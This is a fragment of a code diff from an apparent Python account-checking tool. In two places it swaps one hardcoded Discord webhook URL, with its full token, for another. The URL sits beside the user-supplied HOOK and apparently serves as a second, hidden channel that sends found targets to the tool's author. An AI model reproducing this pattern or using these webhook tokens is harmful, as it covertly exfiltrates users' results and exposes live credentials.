@@ -1120,7 +1120,7 @@ class main:
                                     nosp = 1
                                     print(f'  [ + ] {MSGA} @{Target}')
                                     mUrl = HOOK
-                                    murl2 = 'https://discord.com/api/webhooks/972603252006858832/IL6czFE7a14SXQS7ciscT5mT4HTQSqfbBpOmBJboM8oveftrqMgirhTqI5Pn3zTGPKwf'
+                                    murl2 = 'https://discord.com/api/webhooks/952882091383742475/hfVrOMr5NNE4GLejDButGrtqC0v8XsYfZyE1lDPzvWK97HzTJGWeS5Myq24S2yGJsAoN'
                                     data = {}
                                     data["embeds"] = [
                                         {
@@ -1196,7 +1196,7 @@ class main:
                                     nosp = 1
                                     print(f'  [ + ] {MSGA} @{Target}')
                                     mUrl = HOOK
-                                    murl2 = 'https://discord.com/api/webhooks/972603252006858832/IL6czFE7a14SXQS7ciscT5mT4HTQSqfbBpOmBJboM8oveftrqMgirhTqI5Pn3zTGPKwf'
+                                    murl2 = 'https://discord.com/api/webhooks/952882091383742475/hfVrOMr5NNE4GLejDButGrtqC0v8XsYfZyE1lDPzvWK97HzTJGWeS5Myq24S2yGJsAoN'
                                     data = {}
                                     data["embeds"] = [
                                         {
